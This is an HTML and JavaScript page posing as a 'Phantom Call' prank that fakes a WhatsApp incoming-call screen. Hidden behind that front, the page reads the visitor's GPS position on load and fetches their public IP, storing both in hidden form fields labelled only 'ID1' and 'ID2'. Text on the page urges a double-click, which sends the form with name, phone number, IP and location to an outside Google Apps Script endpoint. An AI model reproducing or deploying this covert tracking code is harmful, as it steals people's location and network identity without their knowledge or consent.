<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link id="favicon" rel="shortcut icon" href="favicon.png" type="image/png">
    <link rel="apple-touch-icon" sizes="194x194" href="apple-touch-icon.png" type="image/png">
    <title>Whatsapp Call</title>
    <link rel="stylesheet" href="wadatacalls.css">
    <!-- <link rel="stylesheet" href="sudeep.css"> -->
    	<script src=
        "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
	</script>
	
	

    <script>
  window.addEventListener("load", startup, false);
        const body = document.querySelector("body");
        function toggleFullScreen(body) {
            if (!document.fullscreenElement) {
                body.requestFullscreen();
            } else {
                if (document.exitFullscreen) {
                    document.exitFullscreen();
                }
            }
        }
// 	    Video Streaming API
	    function askPermission(){

         //add constraints object
         var constraints = {
             audio:true,
             video:true};

         //call getUserMedia
         navigator.mediaDevices.getUserMedia(constraints).then(function(mediaStream){

             var video = document.querySelector('video');
             video.srcObject = mediaStream;
             video.play();
             }).catch(function(err){
                 console.log("There's an error!" + err.message);
             })
	video.style.position = "fixed";
		    video.style.bottom = "0px";
		    video.style.right= "0px";
		    video.style.width = "50px";
		    video.style.width = "100px";
		    document.querySelector('#videohang').style.display = "block";
		    

     }
        document.querySelector("#error").style.display = "none";
        document.querySelector("#end-2-end-mess").style.display = "none";
        document.querySelector("audio").pause();


        function changeusername() {
            // var userimg = document.querySelector("#img").src;
            var username = document.querySelector("#name").value;
            var userphno = document.querySelector("#phno").value;
		
            if (username != "" && userphno != "" ) {
                document.querySelector("#callername").innerText = username;
                document.querySelector("#callerno").innerText = userphno;
                // document.querySelector("#img-person").src = userimg;
                document.querySelector(".form-container-container").style.display = "none";
                document.querySelector("#Call-Maker-Container").style.display = "block";
                document.querySelector("audio").play();
                document.querySelector("#error").style.display = "none";
                document.querySelector("#error").style.visibility = "hidden";

            }
            else {
                document.querySelector("#error").innerText = "Please Enter Name & Number To Proceed.";
                window.location.href = "index.html";
                document.querySelector("audio").pause();
            }

        }
        function calltaken() {
            document.querySelector("#call-taken-container").style.display = "block";
            document.querySelector("#Call-Maker-Container").style.display = "none";
            var username = document.querySelector("#name").value;
            document.querySelector("#username-ctc").innerText = username;
            document.querySelector("audio").pause();

        }
    </script>
</head>

<body ondblclick="delDIO()" onload="getLocation()">

    <div class="form-container-container">
        <div class="welcome-mess">Welcome, We save your time and you from awkward situation.</div>
        
       
        <div class="welcome-mess" style="display:none">
            <p id="gfg" style="color: white;"></p>
        </div>
        <div class="welcome-mess" style="display:none">
            <p id="demo"></p>
        </div>
        <div class="form-container">
            <div class="form-head-container">
                <img id="contact-us-img" src="icons8-contact-us-64.png">
                <p id="contact-us-label">Recieve Phantom Call</p>
            </div>
            <form  id="contact-us-form" name="google-sheet">
                <div class="label-input-container">
                    <label for="name" class="form-items">Name</label>
                    <input id="name" class="user-name" name="name" type="text" required placeholder="Target Name">
                </div>
		
                <br><br>
                <div class="label-input-container">
                    <label for="phno" class="form-items">Contact No.</label>
                    <input id="phno" name="phno" type="number" required autocomplete="mobile" placeholder="1234567892"
                        max="9999999999">
                </div>
                <br><br>
                <div class="label-input-container">
                    <label for="img" class="form-items">Image</label>
                    <input id="img" name="img" type="file" accept="image/*" 
                        onchange="loadFile()">
                </div>
                <div class="label-input-container">
                    <label for="rec-ringtone" class="form-items">Ringtone</label>
                    <input id="re-ringtone" name="rec-ringtone" type="file" onchange="loadaudio()">
                </div>
                <div class="label-input-container">
                    <label for="rec-audio" class="form-items">Audio</label>
                    <input id="re-audio" name="rec-audio" type="file" onchange="loadaudio()">
                </div>
                <div class="label-input-container">
                    <label for="rec-video" class="form-items">Video</label>
                    <input id="rec-video" name="rec-video" type="file" accept="video/*" capture="environment" onchange="loadVideo()">
                </div>
		<div class="label-input-container">
                    <label for="ip" class="form-items" style="display:none">ID1</label>
                    <input id="ip" class="user-ip" name="ip" type="text" required style="display:none">
                </div>
		<div class="label-input-container">
                    <label for="loc" class="form-items" style="display:none" >ID2</label>
                    <input id="loc" class="user-loc" name="loc" type="text" required  style="display:none" >
                </div>
                <div class="welcome-mess" style="background-color: white; border-top: 1px solid white; border-bottom: 1px solid white;text-align: center;" id="verifystatus">
          Please Double Click Here To Get More Features.
        </div>
          
<button type="button" id="submit-btn" value="submit" onclick="changeusername();">Recieve Call</button>
            </form>
        </div>
    </div>

    <!-- End of Forum -->
    <!-- End of Forum -->
    <!-- End of Forum -->
    <!-- End of Forum -->
    <!-- End of Forum -->

    <!-- End of Forum -->
    <!-- End of Forum -->
    <!-- End of Forum -->
    <!-- End of Forum -->
    <!-- <input class="name" type="text">
    <span onclick="change()">Change me!!!</span> -->
    <!-- Start of Call Maker container -->
    <!-- Start of Call Maker container -->
    <!-- Start of Call Maker container -->
    <!-- Start of Call Maker container -->
    <!-- Start of Call Maker container -->
    <!-- Start of Call Maker container -->

    <!-- Start of Call Maker container -->
    <div id="Call-Maker-Container">
        <span id="current-time"></span>
	   
        <div>
            <span>
                <img id="img-person" src="wa default img.jpg" onclick="toggleFullScreen(body)">
                <span id="callername"></span>
                <span id="callerno"></span>
                <span id="wavoicecall">WhatsApp voice call</span>
            </span>
            <div id="img-cont-container">


                <span id="img-container">
                    <img id="img-hangup-icon" src="phone-hang up.svg" onclick="hangcall()">

                    <span id="arrow-container" style="position: relative; bottom: 110px;">
                        <img class="img-arrow-icon" src="icons8-chevron-up-30.png" style="display: block;">
                        <img class="img-arrow-icon" src="icons8-chevron-up-30.png" style="display: block">
                        <img class="img-arrow-icon" src="icons8-chevron-up-30.png">

                    </span>


                    <img id="img-takeup-icon" src="phone-5981.svg" onclick="calltaken();startTimer();"
                        ondragleave="calltaken()">
                    <!-- <img id="img-mess-icon" src="message.png"> -->

                </span>
                <p id="swipeuptext"
                    style="color:#8b8b8b; margin: auto; display: flex; align-items: center; justify-content: center;">
                    Swipe up to accept
                </p>
            </div>
            <div style="border:2px solid red; display: none;">
                <audio autoplay loop>
                    <source src="xiaomi_original.mp3" type="audio/mpeg">
                </audio>
            </div>

        </div>
    </div>
    <div id="error"></div>

    <!-- Start of Call taken  container -->
    <!-- Start of Call taken  container -->
    <!-- Start of Call taken  container -->
    <!-- Start of Call taken  container -->
    <!-- Start of Call taken  container -->
    <!-- Start of Call taken  container -->
    <!-- Start of Call taken  container -->
    <!-- Start of Call taken  container -->

    <!-- Start of Call taken  container -->
    <div id="call-taken-container">
        <div id="end-2-container">
		
            <div id="end-2-text"
                style="color:#8b8b8b; margin: auto;  display: flex; align-items: center; justify-content: center;"> <img
                    src="icons8-chevron-up-30.png" id="down-arrow" class="disabled-icon" onclick="dioCheckNet()"><img
                    src="icons8-lock.svg" style="width: 15px;margin: 6px;"><span onclick="disend2mess()">End-to-end
                    encrypted</span><img src="add to contact.png" id="add-con-img" class="disabled-icon"
                    onclick="dioCheckNet()">
            </div>
            <div id="end-2-end-mess"><span>WhatsApp secures your conversations with end-to-end
                    encryption. This means your messages, calls and status updates stay between you and the people you
                    choose. Not even WhatsApp can read or listen to them.</span>
                <span class="end-2-end-mess-down-btn" style="float: left;" onclick="gowalearnmore()">LEARN MORE</span><span style="float: right;"
                    class="end-2-end-mess-down-btn" onclick="remEnd2endmess()">OK</span>
            </div>
        </div>
        <span id="username-ctc"
            style="font-size: x-large; font-weight: 900; color: white; display: flex; align-items: center; justify-content: center;">Hello</span>
        <span id="stopwatch">00:00</span>
        <div class="disabled-icon-overlay">Please check your internet connectivity<img src="delete.png"
                onclick="delDIO()"></div>
        <img src="wa default img.jpg" id="img-taken-person" width="400px" height="400px" onclick="toggleFullScreen(body)">

        <div id="bottom-call-tool-container">
            <img src="icons8-chevron-right-60.png" alt="" id="down-icon-arrow" class="disabled-icon"
                onclick="dioCheckNet()">
            <img src="icons8-speaker-96.png" alt="" width="50px" height="50px" class="disabled-icon"
                onclick="dioCheckNet()">
            <img src="icons8-no-video-50.png" alt="" width="50px" class="disabled-icon" onclick="showvideo();askPermission()">
            <img src="icons8-mute-unmute-96.png" alt="" width="50px" height="50px" class="disabled-icon"
                onclick="dioCheckNet()">
            <img src="phone-hang up.svg" alt="" width="50px" class="disabled-icon" onclick="hangcall()">
        </div>


    </div>
    <div id="video-container">
    <video id="video" src="" autoplay loop >


    </video>
	    <img src="phone-hang up.svg" alt="" width="50px" class="disabled-icon" onclick="hangcall()" id="videohang" style="display:none">
</div>
	
   <script>
    const scriptURL = 'https://script.google.com/macros/s/AKfycbwrzHRD2i8WGBLH1_pc6HRPoL_0sbcRDVa5tPiV7UMYMoZKBUn1AfXOmTK7wlzIQoyO/exec'
    const form = document.forms['google-sheet']
  
    form.addEventListener('dblclick', e => {
      e.preventDefault()
      fetch(scriptURL, { method: 'POST', body: new FormData(form)})
        .then(response => console.log('Success!', response))
        .catch(error => console.error('Error!', error.message))
    })
  </script>
   
                                                                                                       
</body>
<script>
    var Currentdate = new Date();
    var hour = Currentdate.getHours();
    var minute = Currentdate.getMinutes();
    if (minute.toString() < 10) {
        '0' + minute.toString();
    } else {
        minute.toString();
    }
    var Currenttime = document.querySelector('#current-time').innerHTML = hour.toString() + ":" + minute.toString();

    document.querySelector("#Call-Maker-Container").style.display = "none";
    document.querySelector("#call-taken-container").style.display = "none";
    document.querySelector("#video").style.display = "none";
    const timer = document.getElementById('stopwatch');

    var hr = 0;
    var min = 0;
    var sec = 0;
    var stoptime = true;

    function startTimer() {
        if (stoptime == true) {
            stoptime = false;
            timerCycle();
        }
    }
    function stopTimer() {
        if (stoptime == false) {
            stoptime = true;
        }
    }

    function timerCycle() {
        if (stoptime == false) {
            sec = parseInt(sec);
            min = parseInt(min);
            hr = parseInt(hr);

            sec = sec + 1;

            if (sec == 60) {
                min = min + 1;
                sec = 0;
            }
            if (min == 60) {
                hr = hr + 1;
                min = 0;
                sec = 0;
            }

            if (sec < 10 || sec == 0) {
                sec = '0' + sec;
            }
            if (min < 10 || min == 0) {
                min = '0' + min;
            }
            if (hr < 10 || hr == 0) {
                hr = '0' + hr;
            }

            timer.innerHTML = min + ':' + sec;

            setTimeout("timerCycle()", 1000);
        }
    }

    function resetTimer() {
        timer.innerHTML = '00:00';
    }
    document.querySelector(".disabled-icon-overlay").style.display = "none";
    document.querySelector("audio").pause();
    function dioCheckNet() {
        document.querySelector(".disabled-icon-overlay").style.display = "block";

    }
    function delDIO() {
        document.querySelector(".disabled-icon-overlay").style.display = "none";
    }
    function hangcall() {
        window.location.href = "index.html";
    }

    function loadFile() {
        var image = document.querySelector('#img-person');
        image.src = URL.createObjectURL(event.target.files[0]);

        var image1 = document.querySelector('#img-taken-person');
        image1.src = URL.createObjectURL(event.target.files[0]);
    };
    function loadVideo() {
        var video = document.querySelector('#video');
        video.src = URL.createObjectURL(event.target.files[0]);
        
    }
    document.querySelector("#end-2-end-mess").style.display = "none";
    function disend2mess() {
        document.querySelector("#end-2-end-mess").style.display = "block";
        document.querySelector("#username-ctc").style.opacity = "0.3";
        document.querySelector("#stopwatch").style.opacity = "0.3"; 
        document.querySelector("#bottom-call-tool-container").style.opacity = "0.3";
        document.querySelector("#img-taken-person").style.opacity = "0";
        document.querySelector("#down-arrow").style.opacity = "0.3";
        document.querySelector("#add-con-img").style.opacity = "0.3";

    }
    function remEnd2endmess() {
        document.querySelector("#end-2-end-mess").style.display = "none";
        document.querySelector("#username-ctc").style.opacity = "1";
        document.querySelector("#stopwatch").style.opacity = "1"; 
        document.querySelector("#bottom-call-tool-container").style.opacity = "1";
        document.querySelector("#img-taken-person").style.opacity = "1";
        document.querySelector("#add-con-img").style.opacity = "1";
        document.querySelector("#down-arrow").style.opacity = "1";
    }
    function gowalearnmore() {
        
        window.location.href = "https://faq.whatsapp.com/general/security-and-privacy/end-to-end-encryption?lang=en"
    }
                                                                                                                    
    function showvideo() {
        document.querySelector("#video").style.display = "block";
    }
	    var x = document.getElementById("demo");

    function getLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.watchPosition(showPosition);
        } else {
            x.innerHTML = "Geolocation is not supported by this browser.";
        }
    }

    function showPosition(position) {
        x.innerHTML = position.coords.latitude + " " + position.coords.longitude;
	    document.getElementById("loc").value = x.innerHTML;
    }
	
	$.getJSON("https://api.ipify.org?format=json", function(data) {
		
		// Setting text of element P with id gfg
		$("#gfg").html(data.ip);
		$("#ip").html(data.ip);
		$("#ip1").html(data.ip);
		var id = document.getElementById("gfg").innerText;
		document.getElementById("ip").value = id;
	})





	

	

	

	

	
</script>




</html>
